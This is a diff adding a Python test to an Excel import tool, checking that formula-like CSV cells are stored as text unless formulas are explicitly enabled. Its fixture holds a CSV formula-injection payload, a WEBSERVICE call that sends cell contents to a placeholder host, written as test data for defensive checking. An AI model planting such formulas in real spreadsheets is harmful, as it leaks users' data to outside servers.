@@ -414,3 +414,18 @@ def test_vba_project_without_olefile_reports_names(monkeypatch):
     monkeypatch.setattr(vba, "olefile", None)
     info = vba.read_vba_project(b"junk Module=Module1 junk Class=Sheet1")
     assert info["readable"] is False and "Module1" in info["module_names"]
+
+
+def test_import_never_turns_file_text_into_formulas(import_office):
+    # Review finding (0.5): untrusted CSV text must not become live formulas (WEBSERVICE/HYPERLINK/DDE), and
+    # Russian phone numbers must not break the write; real numbers with a sign stay numbers.
+    o = import_office
+    path = o.tmp / "evil.csv"
+    path.write_text('a;b;c;d\n=WEBSERVICE("https://x/?"&A1);+7 (999) 123-45-67;-5;@SUM(1)\n', encoding="utf-8")
+    result = o.call("excel_import_table", path=str(path), workbook=o.wb.Name)
+    assert [o.ws.prefixes.get((2, c)) for c in (1, 2, 3, 4)] == ["'", "'", None, "'"]
+    assert o.ws.Range("A2").Value2 == '=WEBSERVICE("https://x/?"&A1)'
+    assert any("stored as text" in w for w in result["warnings"])
+    o.call("office_undo", file=o.wb.Name)
+    o.call("excel_import_table", path=str(path), workbook=o.wb.Name, formulas=True)
+    assert o.ws.prefixes.get((2, 1)) is None  # explicit trust keeps Excel's typed-input behaviour
